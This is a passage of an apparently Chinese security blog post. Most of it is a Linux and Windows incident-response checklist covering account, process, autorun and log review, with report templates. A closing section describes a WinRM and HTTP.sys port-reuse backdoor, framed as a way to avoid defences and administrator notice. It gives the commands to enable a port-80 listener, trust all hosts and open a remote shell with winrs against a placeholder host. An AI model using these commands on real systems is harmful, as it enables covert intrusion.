class="built_in">id</span>:用户说明:家目录:登录之后的shell</span><br></pre></td></tr></table></figure><ul><li><code>/etc/sudoers sudo</code>用户列表</li></ul><h4 id="后门账号排查"><a href="#后门账号排查" class="headerlink" title="后门账号排查"></a>后门账号排查</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uid为0即是超级用户权限账号</span></span><br><span class="line">awk -F: <span class="string">&#x27;&#123;IF($3==0)PRINT $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line"><span class="comment"># 最小权限</span></span><br><span class="line">more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line"><span class="comment"># 检查是否有可登录的后门账号</span></span><br><span class="line">awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -E <span class="string">&quot;/bin/bash$&quot;</span></span><br><span class="line"><span class="comment"># last 用于显示用户最近登录信息 # 登录排查攻击者登录账号和时间</span></span><br><span class="line">last</span><br><span class="line"><span class="comment"># lastb 显示用户错误的登录列表</span></span><br><span class="line">lastb</span><br><span class="line"><span class="comment"># lastlog 显示所有用户上次登录信息</span></span><br><span class="line">lastlog</span><br></pre></td></tr></table></figure><h3 id="进程分析-1"><a href="#进程分析-1" class="headerlink" title="进程分析"></a>进程分析</h3><p>进程也可以在&#x2F;proc下面找到,<strong>Linux一切皆文件</strong></p><ul><li><code>netstat -antlp|more</code> 查看是否打开了可疑端口</li><li>w 命令，查看用户及其进程</li><li>分析开机自启程序&#x2F;脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d</span><br><span class="line">~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>查看计划或定时任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><ul><li>lsof</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsof -i: PORT</span><br><span class="line">lsof -p PID</span><br></pre></td></tr></table></figure><ul><li>ps&#x2F;pstree</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找进程</span></span><br><span class="line">ps -aux|grep java</span><br><span class="line"><span class="comment"># 查看进程的子进程</span></span><br><span class="line">ps -efl | grep java</span><br></pre></td></tr></table></figure><h3 id="通信分析"><a href="#通信分析" class="headerlink" title="通信分析"></a>通信分析</h3><ul><li><code>iptables</code><br>Linux平台下的包过滤防火墙,具有封包过滤、封包重定向和网络地址转换(NAT)等功能</li></ul><table><thead><tr><th>表</th><th>链</th></tr></thead><tbody><tr><td>filter</td><td>INPUT,FORWARD,OUTPUT</td></tr><tr><td>nat</td><td>PREROUTING,OUTPUT,POSTROUTING</td></tr><tr><td>mangle</td><td>PREROUTING,INPUT,FORWARD,OUTPUT,POSTROUTING</td></tr><tr><td>raw</td><td>PREROUTING,OUTPUT</td></tr></tbody></table><table><thead><tr><th>动作</th><th>含义</th></tr></thead><tbody><tr><td>ACCEPT</td><td>允许数据包通过</td></tr><tr><td>DROP</td><td>直接丢弃数据包,不会给数据端发送响应</td></tr><tr><td>REJECT</td><td>拒绝数据包,必要时会给数据端发送响应</td></tr><tr><td>SNAT</td><td>源地址转换,解决内网用户公用一个公网地址</td></tr><tr><td>MASQUERADE</td><td>SNAT的特殊形式,适用于动态IP</td></tr><tr><td>REDIRECT</td><td>在本机做端口映射</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 192.168.10.0/24 可接受,但192.168.10.10丢弃</span></span><br><span class="line">iptables -A INPUT -i eth0 -s 192.168.10.0/24 -j ACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -s 192.168.10.10 -j DROP</span><br><span class="line">iptables -nL --line-number | grep 192.168.10</span><br><span class="line">iptables -L -t nat</span><br><span class="line"><span class="comment"># 重点注意:红队常用nat</span></span><br></pre></td></tr></table></figure><h3 id="木马排查实战流程"><a href="#木马排查实战流程" class="headerlink" title="木马排查实战流程"></a>木马排查实战流程</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22990276/1676536686325-57ac0d70-7818-4f5b-8785-30bd108eb9ed.jpeg" data-fancybox="true"/></div></div><h3 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h3><ol><li><p><code>visualvm</code> 适用于servlet或filter框架组件内存马(JDK1.8以上,bin文件下)自带</p><div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://visualvm.github.io/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://visualvm.github.io/</span></div><div class="bottom"><span class="title">https://visualvm.github.io/</span><span class="cap desc footnote"></span></div></a></div></li><li><p>arthas 适用于servlet或filter框架组件内存马是阿里巴巴开源的Java诊断工具</p><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/alibaba/arthas"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=alibaba&repo=arthas&theme=dark&show_owner=true"/></a></div></li><li><p>copagent 适用于servlet,filter,listenter框架组件内存马</p><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/LandGrey/copagent"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=LandGrey&repo=copagent&theme=dark&show_owner=true"/></a></div></li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261209270.png" data-fancybox="true"/></div></div><h2 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407040913960.jpg" data-fancybox="true"/></div></div><h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><p>取证并非毫无头绪的，病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的dll&#x2F;so模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。</p><p>可以归结为如下4点要素：<strong>流量、内存、模块、启动项。</strong></p><p>流量分析可以使用<code>Wireshark</code>，主要分析下当前主机访问了哪些域名、URL、服务，或者有哪些外网IP在访问本地主机的哪些端口、服务和目录，又使用了何种协议等等。</p><h3 id="实施具体操作"><a href="#实施具体操作" class="headerlink" title="实施具体操作"></a>实施具体操作</h3><p>在简单做完定向分析并取证后，如果客户直接把系统重置了就不需要下一步了，如果客户要求从头到尾把系统排查一下那么就利用工具和手法进行排查。</p><p>对账户、进程、端口、服务、启动项、计划任务、文件、日志进行逐个检测，</p><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li><code>systeminfo</code>查看补丁是否齐全,是否存在<code>ms08-067</code>相关漏洞 </li><li>工具:<code>Windows-exploit-suggester</code></li></ul><h3 id="文件分析-2"><a href="#文件分析-2" class="headerlink" title="文件分析"></a>文件分析</h3><ul><li>相关目录</li></ul><table><thead><tr><th>下载目录</th><th>回收站文件</th></tr></thead><tbody><tr><td>Temp</td><td>History</td></tr><tr><td>应用程序打开历史</td><td>搜索历史</td></tr><tr><td>Lnk</td><td>驱动:(cmd&gt;Drivequery)日期</td></tr><tr><td>进程dll关联查询(tasklist -m)</td><td>共享文件(cmd&gt;Net share)</td></tr><tr><td>最近的文件(资源管理器&gt;%UserProfile%\Recent)</td><td>文件更新</td></tr><tr><td>已安装文件,控制面板或者(regedit&gt;\software\Microsoft\Windows\CurrentVersion\Uninstall\)</td><td></td></tr></tbody></table><ul><li>最近使用文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Recent</span><br><span class="line">C:\Documents and Settings\Default User\Recent</span><br><span class="line">%UserProfile%\Recent</span><br></pre></td></tr></table></figure><ul><li>后门查杀</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动项</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run</span><br><span class="line"><span class="comment"># 用户登录</span></span><br><span class="line">HKCU\Environment</span><br><span class="line">HKLM\SOFTWARE\Microft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line"><span class="comment"># 定时任务/计划任务</span></span><br><span class="line">1. 单击[开始]&gt;[设置]&gt;[控制面板]&gt;[任务计划],查看计划任务属性,便可以发现木马文件的路径</span><br><span class="line">2. 单击[开始]&gt;[运行];输入cmd,然后输入at,检查计算机与网络上的其它计算机之间的会话或计划任务,如有,则确认是否为正常连接</span><br><span class="line"><span class="comment"># 服务自启动</span></span><br><span class="line">1. 单击[开始]&gt;[运行],输入services.msc,注意服务状态和启动类型,检查是否有异常服务</span><br><span class="line"><span class="comment"># dll劫持</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\SessionManager\ExcludeFromKnownDlls</span><br><span class="line"><span class="comment"># COM劫持</span></span><br><span class="line">%APPDATA%\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\</span><br></pre></td></tr></table></figure><h4 id="程序运行记录"><a href="#程序运行记录" class="headerlink" title="程序运行记录"></a>程序运行记录</h4><p>使用<code>WinPrefetchView</code>解析<code>Prefetch</code>文件夹中的<code>.pf</code>文件取证。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262005576.png" data-fancybox="true"/></div></div><h3 id="用户分析-1"><a href="#用户分析-1" class="headerlink" title="用户分析"></a>用户分析</h3><ul><li>查看是否有新增用户</li><li>查看服务器是否有弱口令</li><li>查看管理员对应键值</li><li><code>lusrmgr.msc</code> 查看账户变化</li><li><code>net user</code> 列出当前登录账户</li><li><code>wmic UserAccount get</code> 列出当前系统所有账户</li></ul><p><code>PChunter</code>、D盾</p><div class="tag-plugin image"><div class="image-bg"><img src="http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2022/4/18/%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B711-16494047086361_24691650262648819.png?x-oss-process=style/ImageWaterMark_V1.0" data-fancybox="true"/></div></div><h3 id="进程分析-2"><a href="#进程分析-2" class="headerlink" title="进程分析"></a>进程分析</h3><ul><li><code>netstat -ano</code> 查看是否打开了可疑端口</li><li><code>tasklist</code> 查看是否有可疑进程</li><li>分析开机自启程序</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">(ProfilePath)\Start Menu\Programs\Startup 启动项</span><br><span class="line">msconfig 启动选项卡</span><br><span class="line">gpedit.msc 组策略编辑器</span><br></pre></td></tr></table></figure><ul><li>查看计划或定时任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Tasks\</span><br><span class="line">C:\Windows\SysWOW64\Tasks\</span><br><span class="line">C:\Windows\tasks\</span><br><span class="line">schtasks</span><br><span class="line">taskschd.msc</span><br><span class="line">compmgmt.msc</span><br></pre></td></tr></table></figure><ul><li>查看启动服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure><p>主要注意点大致就是：<strong>没有厂商名字</strong>、没有<strong>签名验证信息</strong>、没有<strong>描述信息</strong>的可疑进程。还有典型的挖矿现象(CPU 或内存资源占用长时间过高)的进程。</p><p><code>Pchunter</code>：黑色为微软官方进程，蓝色为外界安装软件进程，红色为可疑进程，同时注意进程参数</p><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261956364.png" alt="image-20230626195602257" style="zoom:200%;" /><p><code>process Explorer</code>:进程浏览器。界面功能从左到右为：<code>Process进程</code>、<code>CPU占比</code>、<code>Private Bytes提交大小</code>、<code>Working Set(工作设置、内存)</code>、<code>PID</code>、<code>Description描述</code>、<code>Company Name</code>公司名。</p><p>小技巧：被注入的进程属性里会多出**.NET Assemblies<strong>和</strong>.NET Performance**两个菜单</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261957571.png" data-fancybox="true"/></div></div><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><ul><li>事件查看</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eventvwr.msc</span><br></pre></td></tr></table></figure><ul><li>系统日志</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志路径</span></span><br><span class="line">C:\Windows\System32\winevt\Logs</span><br><span class="line">C:\windows\Minidump</span><br><span class="line"><span class="comment"># 必看日志</span></span><br><span class="line">Security.evtx、System.evtx、Application.evtx</span><br><span class="line"><span class="comment"># 特殊ID号</span></span><br><span class="line">4624、4625、4634、4624、4672管理员登录</span><br><span class="line"><span class="comment"># 查看是否执行了某些命令比如4688,创建新进程4732安全组管理</span></span><br><span class="line"><span class="comment"># 4724用户账户管理 4738、4722、4720、4728</span></span><br></pre></td></tr></table></figure><p>在取证那一步就做的工作，由于日志是最容易被删除或覆盖，所以一上去就要优先保存日志。</p><p>windows下可疑打开事件管理器或者使用<code>EventLogExplorer</code>、<code>Logparse</code>等工具。</p><p>重要的事件日志ID如下：</p><table><thead><tr><th>Event ID(2000&#x2F;XP&#x2F;2003)</th><th>Event ID(Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012)</th><th>描述</th><th>日志名称</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>成功&#x2F;失败的账户认证</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务服务的启动类型已从禁用更改为自动启动</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>System</td></tr></tbody></table><h3 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h3><p>注意以下状态的网络连接：<strong>ESTABLISHED：连接建立数据传输</strong>。<strong>LISTEN：监听中等待连接</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261931794.png" data-fancybox="true"/></div></div><p><code>Tcpview</code>、火绒剑、命令行下<code>netstat -ano</code>：</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261940016.png" data-fancybox="true"/></div></div><p><code>DNSQuerySniffer</code>：DNS解析查询工具。可以通过此工具确定访问恶意域名的端口号，该工具还可以将主机访问过的所有域名记录下来。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261944205.png" data-fancybox="true"/></div></div><h3 id="启动项、计划任务、服务"><a href="#启动项、计划任务、服务" class="headerlink" title="启动项、计划任务、服务"></a>启动项、计划任务、服务</h3><p><code>autoruns</code>:检查启动项、计划任务、服务最推荐的工具。<code>autoruns</code>可以看到启动项的可执行文件路径和启动命令。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261959492.png" data-fancybox="true"/></div></div><p>WMI后门：无文件，相对来说难以排查，但也可以使用<code>autoruns</code>排查。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262000594.png" data-fancybox="true"/></div></div><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>查看系统环境变量</li><li>WinRM端口复用连接排查<ul><li>在默认情况下,WinRM服务的端口为5985,但可通过配置将其改成80端口</li><li>在排查时,可使用命令<code>winrm enumerate winrm/config/listener</code>查看是否启动服务,当存在返回信息时,则说明服务运行中,当无返回信息时,则服务关闭</li></ul></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211072213355.png" data-fancybox="true"/></div></div><ul><li>关闭服务命令<ul><li>cmd:<code>winrm delete winrm/config/Listener?Address=*+Transport=HTTP</code></li><li>powershell<ul><li><code>Set-Service -Name winrm -StartupType Disabled</code></li><li><code>Stop-Service winrm</code></li></ul></li></ul></li></ul><h2 id="研判与溯源"><a href="#研判与溯源" class="headerlink" title="研判与溯源"></a>研判与溯源</h2><h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22990276/1676538620816-69cf0978-2f9d-46b6-a9d7-b7a23aad30b4.jpeg" data-fancybox="true"/></div></div><ol><li>定位事件<ol><li>设备告警</li><li>辅助设备</li><li>告警事件</li><li>应急响应</li></ol></li><li>分析服务器以及相应服务开放的端口 <ol><li>21 3389 445 443 80 3306 8080</li></ol></li><li>分析服务被攻击的方法 <ol><li>OWASP TOP 10</li><li>爆破</li><li>欺骗</li><li>钓鱼</li><li>漏洞利用</li></ol></li><li>分析日志</li><li>查找Webshell</li><li>分析网站数据库连接账号权限</li><li>分析网站容器权限</li><li>被提权了 <ol><li>查看补丁</li><li>查看账号连接情况（分析注册表如是否被克隆账号）</li><li>查看网络连接</li><li>分析进程</li><li>分析注册表启动程序</li><li>分析日志</li><li>分析一些提权工具 <ol><li>漏洞利用程序</li><li>执行对比命令</li><li>mimakatz</li></ol></li></ol></li><li>报告整理</li></ol><h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262012302.png" data-fancybox="true"/></div></div><h3 id="用户画像绘制流程"><a href="#用户画像绘制流程" class="headerlink" title="用户画像绘制流程"></a>用户画像绘制流程</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262012028.png" data-fancybox="true"/></div></div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/2524">https://xz.aliyun.com/t/2524</a></p><h2 id="重大信息安全事件报告表"><a href="#重大信息安全事件报告表" class="headerlink" title="重大信息安全事件报告表"></a>重大信息安全事件报告表</h2><table><thead><tr><th>重大信息安全事件报告表</th><th></th></tr></thead><tbody><tr><td>报告时间： x 年x 月x 日x 时x 分</td><td></td></tr><tr><td>单位名称：</td><td>报告人：</td></tr><tr><td>联系电话：</td><td>通讯地址：</td></tr><tr><td>传真：</td><td>电子邮件：</td></tr><tr><td>发生重大信息安全事件的信息系统名称及用途：</td><td></td></tr><tr><td>负责部门：</td><td>负责人：</td></tr><tr><td>重大信息安全事件的简要描述（如以前出现过类似情况也应加以说明）：</td><td></td></tr><tr><td>初步判定的事故原因：</td><td></td></tr><tr><td>当前采取的措施：</td><td></td></tr><tr><td>本次重大信息安全事件的初步影响状况：</td><td></td></tr><tr><td>影响范围：</td><td>严重程度：</td></tr><tr><td>值班电话：</td><td>传真：</td></tr></tbody></table><h2 id="应急响应总结模板"><a href="#应急响应总结模板" class="headerlink" title="应急响应总结模板"></a>应急响应总结模板</h2><table><thead><tr><th>信息安全事件应急响应结果报告表</th><th></th></tr></thead><tbody><tr><td>原事件报告时间： x 年x 月x 日x 时x 分</td><td></td></tr><tr><td>备案编号： x 年x 月x 日x 第 x 号</td><td></td></tr><tr><td>单位名称：</td><td>报告人：</td></tr><tr><td>联系电话：</td><td>通讯地址：</td></tr><tr><td>信息系统名称及用途：</td><td></td></tr><tr><td>已采用的安全措施：</td><td></td></tr><tr><td>信息安全事件的补充描述及最后判定的事故原因：</td><td></td></tr><tr><td>本次信息安全事件的初步影响状况：</td><td></td></tr><tr><td>事后结果：</td><td>影响范围：</td></tr><tr><td>严重程度：</td><td></td></tr><tr><td>本次信息安全事件的主要处理过程及结果：</td><td></td></tr><tr><td>针对此类信息安全事件应采取的保障信息系统安全的措施和建议：</td><td></td></tr><tr><td>报告人签名：</td><td></td></tr></tbody></table><h2 id="Windows端口复用-番外篇"><a href="#Windows端口复用-番外篇" class="headerlink" title="Windows端口复用-番外篇"></a>Windows端口复用-番外篇</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>使用<code>HTTP.sys</code>中的<code>Net.tcp Port Sharing</code>服务，配合<code>WinRM</code>实现端口复用。</p><ul><li>优点：<code>HTTP.sys</code>为<code>windows</code>原生机制，<code>WinRM</code>为<code>windows</code>自带功能，动作较小，不易触发主动防御。</li><li>需要管理员权限</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="HTTP-sys"><a href="#HTTP-sys" class="headerlink" title="HTTP.sys"></a>HTTP.sys</h4><p><code>HTTP.sys</code>是<code>Microsoft Windows</code>处理HTTP请求的内核驱动程序。</p><ul><li>为了优化IIS服务器性能</li><li>从IIS6.0引入（即<code>Windows Server 2003</code>及以上版本）</li><li>IIS服务进程依赖<code>HTTP.sys</code></li></ul><p><code>HTTP.sys</code>监听HTTP流量，然后根据URL注册的情况去分发，以实现多个进程在同一个端口监听HTTP流量。微软公开了<code>HTTP Server API</code>库，<code>Httpcfg</code>、<code>Netsh</code>等都是基于它的。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407040941125.png" data-fancybox="true"/></div></div><p>整个过程描述如下：<br><strong>Step 1.注册：</strong>IIS或其他应用使用<code>HTTP Server API</code>时，需要先在<code>HTTP.sys</code>上面注册<code>url prefix</code>，以监听请求路径。<br><strong>Step 2.路由：</strong><code>HTTP.sys</code>获取到<code>request</code>请求，并分发这个请求给注册当前url对应的应用。</p><h4 id="Net-tcp-Port-Sharing"><a href="#Net-tcp-Port-Sharing" class="headerlink" title="Net.tcp Port Sharing"></a>Net.tcp Port Sharing</h4><p><code>Net.tcp Port Sharing</code>服务是WCF（<code>Windows Communication Foundation</code>，微软的一个框架）中的一个新系统组件，这个服务会开启<code>Net.tcp</code>端口共享功能以达到在用户的不同进程之间实现端口共享。这个机制的最终是在<code>HTTP.sys</code>中实现的。目前将许多不同HTTP应用程序的流量复用到单个TCP端口上的<code>HTTP.sys</code>模型已经成为<code>windows</code>平台上的标准配置。</p><p>在以前的web应用中，一个web应用绑定一个端口，若有其他应用则需要绑定其他的端口才能实现监听。如下图所示，<code>Web Application 1</code>绑定了80端口后，<code>Web Application 2</code>再去绑定80端口会出错。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071807538.png" data-fancybox="true"/></div></div><p>现在使用微软提供的<code>NET.tcp Port Sharing</code>服务，只要遵循相关的开发接口规则，就可以实现不同的应用共享相同的Web服务器端口。如下图中<code>Web Application 1</code>和<code>Web Application 2</code>同时绑定在80端口。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071808276.png" data-fancybox="true"/></div></div><h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><p><code>WinRM</code>全称是<code>Windows Remote Management</code>，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。<code>WinRM</code>服务能够让管理员远程登录<code>Windows</code>操作系统，获得一个类似<code>telnet</code>的交互式命令行shell，而底层通讯协议使用的正是HTTP。</p><p>事实上，<code>WinRM</code>已经在<code>HTTP.sys</code>上注册了名为<code>wsman</code>的url前缀，默认监听端口<code>5985</code>。因此，在安装了IIS的边界Windows服务器上，开启<code>WinRM</code>服务后修改默认listener端口为80或新增一个80端口的listener即可实现端口复用，可以直接通过80端口登录Windows服务器<br><strong>查询当前注册url前缀</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh http show servicestate</span><br></pre></td></tr></table></figure><p><strong>开启winrm服务</strong><br>Windows 2012及以上：winrm默认启动并监听了5985端口。<br>Windows 2008：需要手动启动winrm。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br></pre></td></tr></table></figure><p><strong>增加80端口复用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/service @&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>更改winrm为80端口</strong></p><ul><li>默认5985端口开启，不需要更改端口。</li><li>默认5985端口不开启，则更改winrm为80端口，否则会因端口改变而引起管理员关注。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>攻击机(Windows Server 2008 R2)也需要启动winrm并设置信任连接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动winrm</span></span><br><span class="line">winrm quickconfig ‐q</span><br><span class="line"><span class="comment"># 设置信任主机地址</span></span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>连接使用winrs命令接口连接远程winrm服务执行命令，并返回结果</strong><br><code>winrs</code>，<code>Windows Remote Shell</code>，<code>windows远程shell</code>，是<code>winrm</code>的一个组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs ‐r:http://www.aabbcc.com ‐u:administrator ‐p:Password [命令]</span><br></pre></td></tr></table></figure><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="端口复用"><a href="#端口复用" class="headerlink" 